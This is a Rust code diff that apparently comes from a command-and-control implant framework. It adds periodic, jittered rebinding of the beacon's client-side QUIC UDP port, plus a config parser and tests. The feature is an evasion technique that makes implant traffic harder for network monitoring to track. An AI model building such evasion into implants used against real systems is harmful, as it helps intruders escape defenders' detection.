@@ -92,6 +92,8 @@ struct Inner {
 pub struct QuicTransport {
     inner: Arc<Mutex<Inner>>,
     uri: String,
+    rebind_interval: u64,
+    rebind_jitter: f32,
 }
 
 impl std::fmt::Debug for QuicTransport {
@@ -155,6 +157,57 @@ impl QuicTransport {
             ep.set_default_client_config(quinn::ClientConfig::new(std::sync::Arc::new(
                 quic_config,
             )));
+
+            let rebind_interval = self.rebind_interval;
+            let rebind_jitter = self.rebind_jitter;
+            let weak_inner = Arc::downgrade(&self.inner);
+            tokio::spawn(async move {
+                loop {
+                    let generated_jitter = rand::random::<f32>() * rebind_jitter;
+                    let effective_interval = (rebind_interval as f32) * (1.0 - generated_jitter);
+                    tokio::time::sleep(std::time::Duration::from_secs_f32(effective_interval))
+                        .await;
+
+                    let inner = match weak_inner.upgrade() {
+                        Some(inner) => inner,
+                        None => {
+                            #[cfg(feature = "print_debug")]
+                            log::debug!("QuicTransport dropped, terminating rebind loop");
+                            break;
+                        }
+                    };
+
+                    let endpoint = {
+                        let inner_guard = inner.lock().await;
+                        match &inner_guard.endpoint {
+                            Some(ep) => ep.clone(),
+                            None => break,
+                        }
+                    };
+
+                    match std::net::UdpSocket::bind("0.0.0.0:0") {
+                        Ok(socket) => {
+                            if let Err(_e) = socket.set_nonblocking(true) {
+                                #[cfg(feature = "print_debug")]
+                                log::error!("Failed to set socket non-blocking: {:?}", _e);
+                                continue;
+                            }
+                            if let Err(_e) = endpoint.rebind(socket) {
+                                #[cfg(feature = "print_debug")]
+                                log::error!("Failed to rebind quinn endpoint: {:?}", _e);
+                                break;
+                            }
+                            #[cfg(feature = "print_debug")]
+                            log::info!("Successfully rebound client-side QUIC port");
+                        }
+                        Err(_e) => {
+                            #[cfg(feature = "print_debug")]
+                            log::error!("Failed to bind new UDP socket: {:?}", _e);
+                        }
+                    }
+                }
+            });
+
             inner.endpoint = Some(ep.clone());
             ep
         };
@@ -286,17 +339,23 @@ impl Transport for QuicTransport {
                 connection: None,
             })),
             uri: String::new(),
+            rebind_interval: 220,
+            rebind_jitter: 0.15,
         }
     }
 
     fn new(config: Config) -> Result<Self> {
         let uri = crate::transport::extract_uri_from_config(&config)?;
+        let rebind_cfg = extract_rebind_config(&config);
+
         Ok(Self {
             inner: Arc::new(Mutex::new(Inner {
                 endpoint: None,
                 connection: None,
             })),
             uri,
+            rebind_interval: rebind_cfg.interval,
+            rebind_jitter: rebind_cfg.jitter,
         })
     }
 
@@ -523,5 +582,88 @@ impl Transport for QuicTransport {
             }
         }
         Ok(())
+    }
+}
+
+struct RebindConfig {
+    interval: u64,
+    jitter: f32,
+}
+
+fn extract_rebind_config(config: &pb::config::Config) -> RebindConfig {
+    let extra = crate::transport::extract_extra_from_config(config);
+    let interval = extra
+        .get("rebind_interval")
+        .and_then(|val| val.parse::<u64>().ok())
+        .unwrap_or(220);
+    let jitter = extra
+        .get("rebind_jitter")
+        .and_then(|val| val.parse::<f32>().ok())
+        .unwrap_or(0.15)
+        .clamp(0.0, 1.0);
+    RebindConfig { interval, jitter }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use pb::c2::{AvailableTransports, Beacon};
+    use pb::config::Config;
+
+    fn create_test_config_with_extra(extra: &str) -> Config {
+        Config {
+            info: Some(Beacon {
+                available_transports: Some(AvailableTransports {
+                    transports: vec![pb::c2::Transport {
+                        uri: "quic://127.0.0.1:8443".to_string(),
+                        interval: 5,
+                        r#type: pb::c2::transport::Type::TransportQuic as i32,
+                        extra: extra.to_string(),
+                        jitter: 0.0,
+                    }],
+                    active_index: 0,
+                }),
+                ..Default::default()
+            }),
+            ..Default::default()
+        }
+    }
+
+    #[test]
+    fn test_extract_rebind_config_defaults() {
+        let config = create_test_config_with_extra("{}");
+        let rebind_cfg = extract_rebind_config(&config);
+        assert_eq!(rebind_cfg.interval, 220);
+        assert_eq!(rebind_cfg.jitter, 0.15);
+    }
+
+    #[test]
+    fn test_extract_rebind_config_custom() {
+        let config =
+            create_test_config_with_extra(r#"{"rebind_interval": "60", "rebind_jitter": "0.3"}"#);
+        let rebind_cfg = extract_rebind_config(&config);
+        assert_eq!(rebind_cfg.interval, 60);
+        assert_eq!(rebind_cfg.jitter, 0.3);
+    }
+
+    #[test]
+    fn test_extract_rebind_config_invalid() {
+        let config =
+            create_test_config_with_extra(r#"{"rebind_interval": "abc", "rebind_jitter": "xyz"}"#);
+        let rebind_cfg = extract_rebind_config(&config);
+        assert_eq!(rebind_cfg.interval, 220);
+        assert_eq!(rebind_cfg.jitter, 0.15);
+    }
+
+    #[tokio::test]
+    async fn test_quinn_endpoint_rebind_success() {
+        // Create an endpoint
+        let endpoint = quinn::Endpoint::client("127.0.0.1:0".parse().unwrap()).unwrap();
+        // Bind a new socket
+        let new_socket = std::net::UdpSocket::bind("127.0.0.1:0").unwrap();
+        new_socket.set_nonblocking(true).unwrap();
+        // Verify rebind works
+        let res = endpoint.rebind(new_socket);
+        assert!(res.is_ok());
     }
 }
